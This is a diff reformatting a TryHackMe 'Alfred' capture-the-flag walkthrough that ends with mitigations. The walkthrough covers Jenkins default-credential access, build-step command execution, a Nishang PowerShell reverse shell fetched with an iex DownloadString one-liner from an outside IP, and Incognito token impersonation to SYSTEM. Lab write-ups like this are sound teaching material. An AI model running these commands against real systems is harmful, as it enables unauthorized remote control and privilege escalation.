@@ -2,7 +2,7 @@
 
 ## Overview
 
-Full walkthrough of the TryHackMe Alfred Windows box, gaining initial access by logging into a Jenkins CI/CD server with default `admin:admin` credentials and abusing the Execute Windows batch command build step to land a Nishang PowerShell reverse shell as `alfred\bruce`, then upgrading to a Meterpreter session and abusing `SeImpersonatePrivilege` via the Incognito module to impersonate the `BUILTIN\Administrators` token and escalate to `NT AUTHORITY\SYSTEM`.
+Full walkthrough of the TryHackMe Alfred Windows box, gaining initial access by logging into a Jenkins CI/CD server with default **admin:admin** credentials and abusing the Execute Windows batch command build step to land a Nishang PowerShell reverse shell as **alfred\bruce**, then upgrading to a Meterpreter session and abusing **SeImpersonatePrivilege** via the Incognito module to impersonate the *BUILTIN\Administrators* token and escalate to **NT AUTHORITY\SYSTEM**.
 
 **Platform:** TryHackMe | **Room:** Alfred | **Difficulty:** Easy
 
@@ -10,13 +10,13 @@ Full walkthrough of the TryHackMe Alfred Windows box, gaining initial access by 
 
 **Techniques Covered:**
 
-Jenkins Default Credentials → RCE via Build Step → Nishang PowerShell Reverse Shell → Meterpreter Shell Upgrade → SeImpersonatePrivilege → Token Impersonation → SYSTEM
+Jenkins Default Credentials, RCE via Build Step, Nishang PowerShell Reverse Shell, Meterpreter Shell Upgrade, SeImpersonatePrivilege, Token Impersonation, SYSTEM
 
 ---
 
 ## 1. Enumeration
 
-An Nmap scan with `-Pn` was required as the target does not respond to ICMP ping probes. Three open TCP ports were identified: port 80 (Microsoft IIS), port 3389 (RDP), and port 8080 (Jetty — Jenkins).
+An Nmap scan with -Pn was required as the target does not respond to ICMP ping probes. Three open TCP ports were identified: port 80 (Microsoft IIS), port 3389 (RDP), and port 8080 (Jetty, Jenkins).
 
 ```bash
 nmap -p- -Pn --min-rate 5000 -sC -sV -oN alfred-full.txt 10.65.184.3
@@ -26,9 +26,9 @@ nmap -p- -Pn --min-rate 5000 -sC -sV -oN alfred-full.txt 10.65.184.3
 
 ---
 
-## 2. Jenkins Login — Default Credentials
+## 2. Jenkins Login - Default Credentials
 
-Navigating to port 8080 revealed a Jenkins login panel. Default credentials `admin:admin` were accepted, granting full access to the Jenkins dashboard.
+Navigating to port 8080 revealed a Jenkins login panel. Default credentials **admin:admin** were accepted, granting full access to the Jenkins dashboard.
 
 ```
 http://10.65.184.3:8080
@@ -44,7 +44,7 @@ Password: admin
 
 ## 3. Remote Code Execution via Build Step
 
-Inside the existing `project` job, the Configure menu exposed a **Build** section with an **Execute Windows batch command** step. This feature allows arbitrary system commands to be run on the underlying Windows host as part of a Jenkins build job.
+Inside the existing project job, the Configure menu exposed a **Build** section with an **Execute Windows batch command** step. This feature allows arbitrary system commands to be run on the underlying Windows host as part of a Jenkins build job.
 
 <img src="04-command-execution.png" width="800">
 
@@ -52,7 +52,7 @@ Inside the existing `project` job, the Configure menu exposed a **Build** sectio
 
 ## 4. Nishang PowerShell Reverse Shell
 
-The Nishang toolkit was cloned to Kali and `Invoke-PowerShellTcp.ps1` was modified to auto-execute on download by appending the invocation line to the bottom of the script.
+The Nishang toolkit was cloned to Kali and Invoke-PowerShellTcp.ps1 was modified to auto-execute on download by appending the invocation line to the bottom of the script.
 
 ```bash
 git clone https://github.com/samratashok/nishang
@@ -75,7 +75,7 @@ The following payload was placed in the Jenkins batch command box and the job wa
 powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.203.76:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.76 -Port 4444
 ```
 
-A shell was caught as `alfred\bruce`.
+A shell was caught as **alfred\bruce**.
 
 <img src="06-user-flag.png" width="800">
 
@@ -110,9 +110,9 @@ A Meterpreter session opened successfully.
 
 ---
 
-## 6. Privilege Escalation — Token Impersonation
+## 6. Privilege Escalation - Token Impersonation
 
-Checking privileges confirmed `SeImpersonatePrivilege` and `SeDebugPrivilege` were enabled on the `alfred\bruce` account.
+Checking privileges confirmed **SeImpersonatePrivilege** and **SeDebugPrivilege** were enabled on the alfred\bruce account.
 
 ```
 shell
@@ -129,11 +129,11 @@ impersonate_token "BUILTIN\Administrators"
 getuid
 ```
 
-The `BUILTIN\Administrators` delegation token was available and successfully impersonated, elevating to `NT AUTHORITY\SYSTEM`.
+The *BUILTIN\Administrators* delegation token was available and successfully impersonated, elevating to **NT AUTHORITY\SYSTEM**.
 
 <img src="05-reverse-shell-caught.png" width="800">
 
-To solidify access, the process was migrated to `services.exe`:
+To solidify access, the process was migrated to services.exe:
 
 ```
 ps
@@ -174,9 +174,9 @@ cat "C:/Windows/System32/config/root.txt"
 ## Recommended Mitigations
 
 - Change Jenkins default credentials immediately after installation
-- Restrict Jenkins access to internal networks only — never expose to the internet
+- Restrict Jenkins access to internal networks only. Never expose to the internet
 - Run Jenkins as a low-privilege service account, never as SYSTEM
-- Audit and restrict user token privileges — SeImpersonatePrivilege should not be assigned to non-service accounts
+- Audit and restrict user token privileges. SeImpersonatePrivilege should not be assigned to non-service accounts
 - Monitor for suspicious PowerShell execution, especially DownloadString patterns
 - Implement application whitelisting to prevent unauthorized executable downloads
 
